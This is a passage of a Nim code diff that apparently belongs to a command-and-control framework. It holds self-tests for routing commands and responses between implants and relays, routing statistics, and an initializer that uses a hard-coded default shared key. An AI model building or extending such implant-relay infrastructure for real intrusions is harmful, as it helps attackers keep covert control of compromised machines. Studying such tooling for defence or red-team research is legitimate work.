+        echo "[TEST] 🧪 │ Running comprehensive system tests...           │"
+        echo "[TEST] 🧪 └─────────────────────────────────────────────────┘"
+    
+    # Test 1: Forward message flow
+    when defined debug:
+        echo "[TEST] 🧪 Test 1: Forward message flow"
+    
+    let forwardMsg = createTestMessage(COMMAND, "IMPLANT-001", "test command")
+    if forwardMsg.msgType == COMMAND and forwardMsg.fromID == "IMPLANT-001":
+        result.passed += 1
+        result.details.add("✅ Forward flow: message created")
+        when defined debug:
+            echo "[TEST] 🧪 ✅ Forward message test PASSED"
+    else:
+        result.failed += 1
+        result.details.add("❌ Forward flow failed")
+        when defined debug:
+            echo "[TEST] 🧪 ❌ Forward message test FAILED"
+    
+    # Test 2: Response message flow (reverse routing)
+    when defined debug:
+        echo "[TEST] 🧪 Test 2: Response message flow"
+    
+    var responseMsg = createTestMessage(RESPONSE, "RELAY-ROOT", "command result")
+    responseMsg.route = @["IMPLANT-001", "RELAY-DEEP", "RELAY-INTERMEDIATE", "RELAY-ROOT"]  # Simulate existing route
+    
+    # Test reverse routing logic
+    let currentID = "RELAY-INTERMEDIATE"
+    let prevHop = calculatePreviousHop(responseMsg.route, currentID)
+    
+    if prevHop.found and prevHop.previousHop == "RELAY-DEEP":
+        result.passed += 1
+        result.details.add("✅ Reverse routing: " & prevHop.previousHop)
+        when defined debug:
+            echo "[TEST] 🧪 ✅ Response routing test PASSED"
+    else:
+        result.failed += 1
+        result.details.add("❌ Reverse routing failed")
+        when defined debug:
+            echo "[TEST] 🧪 ❌ Response routing test FAILED"
+    
+    # Test 3: Route validation
+    when defined debug:
+        echo "[TEST] 🧪 Test 3: Route validation"
+    
+    let validRoute = @["IMPLANT-001", "RELAY-DEEP", "RELAY-INTERMEDIATE"]
+    let validation = validateRouteForReverse(validRoute, "RELAY-INTERMEDIATE")
+    
+    if validation.isValid:
+        result.passed += 1
+        result.details.add("✅ Route validation: " & validation.reason)
+        when defined debug:
+            echo "[TEST] 🧪 ✅ Route validation test PASSED"
+    else:
+        result.failed += 1
+        result.details.add("❌ Route validation: " & validation.reason)
+        when defined debug:
+            echo "[TEST] 🧪 ❌ Route validation test FAILED"
+    
+    # Test 4: Message type detection
+    when defined debug:
+        echo "[TEST] 🧪 Test 4: Message type detection"
+    
+    let isResponseTest1 = isResponseMessage(RESPONSE)
+    let isResponseTest2 = isResponseMessage(COMMAND)
+    
+    if isResponseTest1 and not isResponseTest2:
+        result.passed += 1
+        result.details.add("✅ Message type detection works")
+        when defined debug:
+            echo "[TEST] 🧪 ✅ Message type detection test PASSED"
+    else:
+        result.failed += 1
+        result.details.add("❌ Message type detection failed")
+        when defined debug:
+            echo "[TEST] 🧪 ❌ Message type detection test FAILED"
+    
+    # Test 5: Loop prevention
+    when defined debug:
+        echo "[TEST] 🧪 Test 5: Loop prevention"
+    
+    let loopRoute = @["IMPLANT-001", "RELAY-A", "RELAY-B", "RELAY-A"]  # Loop!
+    let loopValidation = validateRouteForReverse(loopRoute, "RELAY-A")
+    
+    # This should be valid (first occurrence of RELAY-A)
+    if loopValidation.isValid:
+        result.passed += 1
+        result.details.add("✅ Loop prevention: handled correctly")
+        when defined debug:
+            echo "[TEST] 🧪 ✅ Loop prevention test PASSED"
+    else:
+        result.failed += 1
+        result.details.add("❌ Loop prevention failed")
+        when defined debug:
+            echo "[TEST] 🧪 ❌ Loop prevention test FAILED"
+    
+    when defined debug:
+        echo "[TEST] 🧪 ┌─────────── TEST RESULTS ───────────┐"
+        echo "[TEST] 🧪 │ Passed: " & $result.passed & " │"
+        echo "[TEST] 🧪 │ Failed: " & $result.failed & " │"
+        echo "[TEST] 🧪 │ Total:  " & $(result.passed + result.failed) & " │"
+        echo "[TEST] 🧪 └─────────────────────────────────────┘"
+        
+        for detail in result.details:
+            echo "[TEST] 🧪 " & detail
+
+# Performance monitoring for routing system
+proc getRoutingPerformanceStats*(): tuple[avgRouteLength: float, maxRouteLength: int, routingEfficiency: float] =
+    let stats = getAdvancedRoutingStats()
+    result.avgRouteLength = stats.avgRouteLength
+    result.maxRouteLength = stats.maxRouteLength
+    result.routingEfficiency = if stats.totalMessages > 0: 1.0 - (float(stats.routingErrors) / float(stats.totalMessages)) else: 1.0
+    
+    when defined debug:
+        echo "[PERF] 📊 Routing Performance Statistics:"
+        echo "[PERF] 📊 - Average route length: " & $result.avgRouteLength & " hops"
+        echo "[PERF] 📊 - Maximum route length: " & $result.maxRouteLength & " hops"
+        echo "[PERF] 📊 - Routing efficiency: " & $(result.routingEfficiency * 100.0) & "%"
+
+# Initialize the complete distributed routing system
+proc initializeDistributedRoutingSystem*(implantID: string, sharedKey: string = "default_shared_key"): bool =
+    when defined debug:
+        echo "[INIT] 🚀 Initializing Distributed Routing System..."
+    
+    try:
+        # Initialize key configuration
+        initializeRelayKeys(implantID, sharedKey)
+        
+        # Validate system readiness
+        let keyStatus = getKeyConfigStatus()
+        if not keyStatus.hasShared:
+            when defined debug:
+                echo "[INIT] ❌ Shared key not initialized"
+            return false
+        
+        when defined debug:
+            echo "[INIT] ✅ Key system initialized"
+            echo "[INIT] 🆔 Implant ID: " & implantID
+            echo "[INIT] 🔑 Shared key: " & (if keyStatus.hasShared: "✅" else: "❌")
+            echo "[INIT] 🔐 Unique key: " & (if keyStatus.hasUnique: "✅" else: "❌")
+        
+        # Test basic functionality
+        let testResults = testDistributedRoutingSystem()
+        if testResults.failed > 0:
+            when defined debug:
+                echo "[INIT] ⚠️ System tests failed: " & $testResults.failed & " failures"
+            return false
+        
+        when defined debug:
+            echo "[INIT] ✅ All system tests passed"
+            echo "[INIT] 🎉 Distributed Routing System ready!"
+        
+        return true
+        
+    except:
+        when defined debug:
+            echo "[INIT] ❌ System initialization failed: " & getCurrentExceptionMsg()
+        return false 
